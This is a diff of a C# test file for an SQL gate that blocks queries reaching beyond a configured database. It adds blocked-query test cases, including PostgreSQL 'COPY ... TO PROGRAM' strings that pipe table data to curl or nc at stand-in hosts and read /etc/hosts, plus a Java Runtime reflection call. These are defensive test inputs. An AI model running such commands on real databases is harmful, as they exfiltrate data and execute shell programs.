@@ -5,7 +5,9 @@ using Beacon.Core;
 using Beacon.Core.Authorization;
 using Beacon.Core.Data;
 using Beacon.Core.Data.Entities;
+using Beacon.Core.Data.Entities.Metadata;
 using Beacon.Core.Data.Enums;
+using Beacon.Core.Exceptions;
 using Beacon.Core.Helpers;
 using Beacon.Core.HostData;
 using Beacon.Core.Models.Queries;
@@ -94,7 +96,7 @@ public class CrossDatabaseQualifierTests
     [TestCaseSource(nameof(Dialects))]
     public void Gate_RunsTheConfiguredDatabase_AndBlocksAnother_WithReadOnlyEnforcementOnOrOff(QualifierCase dialect)
     {
-        var gate = TestSqlGate.Create();
+        var gate = TestSqlGate.Create(deployment: TestSqlGate.Unlocked);
 
         foreach (var enforceReadOnly in new[] { true, false })
         {
@@ -127,6 +129,15 @@ public class CrossDatabaseQualifierTests
     [TestCase("databricks", "SELECT * FROM json.`/mnt/landing/x`")]
     [TestCase("databricks", "SELECT * FROM `s3://bucket/x`")]
     [TestCase("Snowflake", "SELECT * FROM TABLE(EXTERNAL_QUERY('conn', 'SELECT 1'))")]
+    [TestCase("PostgreSQL", "COPY accounts TO PROGRAM 'curl -d @- http://collector'")]
+    [TestCase("PostgreSQL", "COPY accounts FROM PROGRAM 'cat /etc/hosts'")]
+    [TestCase("PostgreSQL", "COPY accounts TO '/tmp/accounts.csv'")]
+    [TestCase("PostgreSQL", "COPY (SELECT * FROM accounts) TO PROGRAM 'nc host 9'")]
+    [TestCase("PostgreSQL", "SELECT pg_background_launch('SELECT 1')")]
+    [TestCase("PostgreSQL", "SELECT * FROM pgr_dijkstra('SELECT id, source, target, cost FROM edges', 1, 2)")]
+    [TestCase("databricks", "SELECT http_request(conn => 'c', method => 'GET', path => '/')")]
+    [TestCase("databricks", "SELECT * FROM read_kafka(bootstrapServers => 'b:9092', subscribe => 't')")]
+    [TestCase("databricks", "SELECT reflect('java.lang.Runtime', 'getRuntime')")]
     public void Gate_WithReadOnlyEnforcementOff_StillRefusesWhatReachesBeyondTheSource(string dialect, string sql)
     {
         var request = SqlGateRequest.FromSettings(sql, dialect, TestSqlGate.DefaultSettings()) with
@@ -135,7 +146,7 @@ public class CrossDatabaseQualifierTests
             ConfiguredDatabase = "Sales"
         };
 
-        var report = TestSqlGate.Create().Evaluate(request);
+        var report = TestSqlGate.Create(deployment: TestSqlGate.Unlocked).Evaluate(request);
 
         report.Blocked.Should().BeTrue();
         report.Verdicts.ReadOnly.Status.Should().NotBe(SqlGateStatus.Fail, "read-only enforcement is off; the boundary stage refuses it");
@@ -152,7 +163,7 @@ public class CrossDatabaseQualifierTests
             ConfiguredDatabase = "sales"
         };
 
-        TestSqlGate.Create().Evaluate(request).Blocked.Should().BeFalse();
+        TestSqlGate.Create(deployment: TestSqlGate.Unlocked).Evaluate(request).Blocked.Should().BeFalse();
     }
 
     // A statement that changes the database, schema, role or user it runs in, or runs SQL held in a string, a variable or
@@ -221,7 +232,7 @@ public class CrossDatabaseQualifierTests
             MaxRows = 10
         };
 
-        var report = TestSqlGate.Create().Evaluate(request);
+        var report = TestSqlGate.Create(deployment: TestSqlGate.Unlocked).Evaluate(request);
 
         report.Blocked.Should().BeTrue();
         report.Verdicts.ReadOnly.Status.Should().NotBe(SqlGateStatus.Fail, "read-only enforcement is off; the boundary stage refuses it");
@@ -258,7 +269,7 @@ public class CrossDatabaseQualifierTests
             MaxRows = 10
         };
 
-        var report = TestSqlGate.Create().Evaluate(request);
+        var report = TestSqlGate.Create(deployment: TestSqlGate.Unlocked).Evaluate(request);
 
         report.Blocked.Should().BeTrue();
         report.Verdicts.Schema.Code.Should().Be(SqlGateCodes.CrossDatabase);
@@ -285,7 +296,7 @@ public class CrossDatabaseQualifierTests
             ConfiguredDatabase = configured
         };
 
-        var report = TestSqlGate.Create().Evaluate(request);
+        var report = TestSqlGate.Create(deployment: TestSqlGate.Unlocked).Evaluate(request);
 
         report.Blocked.Should().BeFalse(report.BlockReason);
         report.Verdicts.Schema.Code.Should().NotBe(SqlGateCodes.CrossDatabase);
@@ -411,7 +422,7 @@ public class CrossDatabaseQualifierTests
             MaxRows = 10
         };
 
-        var report = TestSqlGate.Create().Evaluate(request);
+        var report = TestSqlGate.Create(deployment: TestSqlGate.Unlocked).Evaluate(request);
 
         report.Blocked.Should().BeTrue();
         report.Verdicts.Schema.Code.Should().Be(SqlGateCodes.CrossDatabase);
@@ -483,17 +494,17 @@ public class CrossDatabaseQualifierTests
         await act.Should().ThrowAsync<InvalidOperationException>().WithMessage("*another database*");
     }
 
-    // SQL the parser cannot read is saved as before: it never runs, because every execution gate refuses it.
+    // SQL the parser cannot read could never run — every execution gate refuses it — so it is not saved either.
     [Test]
-    public async Task CreateQuery_SavesSqlTheParserCannotRead_AsBefore()
+    public async Task CreateQuery_RefusesSqlTheParserCannotRead()
     {
         var dialect = Cases().First(x => x.Name == "PostgreSQL");
         var saved = new List<object>();
 
-        var response = await Service(dialect, saved).CreateQuery(NewQuery("SELECT FROM WHERE"), CancellationToken.None);
+        var act = () => Service(dialect, saved).CreateQuery(NewQuery("SELECT FROM WHERE"), CancellationToken.None);
 
-        response.Success.Should().BeTrue();
-        saved.OfType<Query>().Should().ContainSingle();
+        await act.Should().ThrowAsync<InvalidOperationException>().WithMessage("Could not verify this SQL is read-only*");
+        saved.OfType<Query>().Should().BeEmpty();
     }
 
     // Previews and subscription runs execute a saved step through the same path: the qualifier is checked on the bound SQL
@@ -511,7 +522,8 @@ public class CrossDatabaseQualifierTests
 
         if (reachesTheConnection)
         {
-            await act.Should().ThrowAsync<ConnectionReachedException>();
+            await act.Should().ThrowAsync<QueryExecutionFailedException>()
+                .WithMessage($"*{nameof(ConnectionReachedException)}*");
             return;
         }
 
@@ -722,24 +734,12 @@ public class CrossDatabaseQualifierTests
                 {
                     [typeof(DataSource)] = RecordingBeaconContext.MemorySet<DataSource>([dataSource], saved),
                     [typeof(Query)] = RecordingBeaconContext.MemorySet(stored == null ? new List<Query>() : [stored], saved),
-                    [typeof(QueryStep)] = RecordingBeaconContext.MemorySet(steps ?? [], saved)
+                    [typeof(QueryStep)] = RecordingBeaconContext.MemorySet(steps ?? [], saved),
+                    [typeof(DatabaseMetadata)] = RecordingBeaconContext.MemorySet(new List<DatabaseMetadata>(), saved)
                 },
                 saved));
 
-        return new QueryService(
-            factory.Object,
-            connections.Object,
-            Mock.Of<IManualQueryExecutionLogger>(),
-            NullLogger<QueryService>.Instance,
-            NullLoggerFactory.Instance,
-            versions ?? Mock.Of<IQueryVersionService>(),
-            new BeaconConfiguration(),
-            Mock.Of<IBeaconUserContext>(),
-            new SqlReadOnlyAstValidator(NullLogger<SqlReadOnlyAstValidator>.Instance),
-            Mock.Of<IHostDataSourceGuard>(x => x.Check(It.IsAny<DataSource>(), It.IsAny<string>()) == Allowed),
-            TestProjectAccess.Actors(),
-            TestProjectAccess.ExecutionAllowed(),
-            new ConfiguredDatabaseResolver(connections.Object, NullLogger<ConfiguredDatabaseResolver>.Instance));
+        return TestQueryServices.QueryService(factory.Object, connections.Object, versions: versions, configuredDatabases: new ConfiguredDatabaseResolver(connections.Object, NullLogger<ConfiguredDatabaseResolver>.Instance));
     }
 
     private static readonly HostPolicyResult Allowed = new(true, null, []);
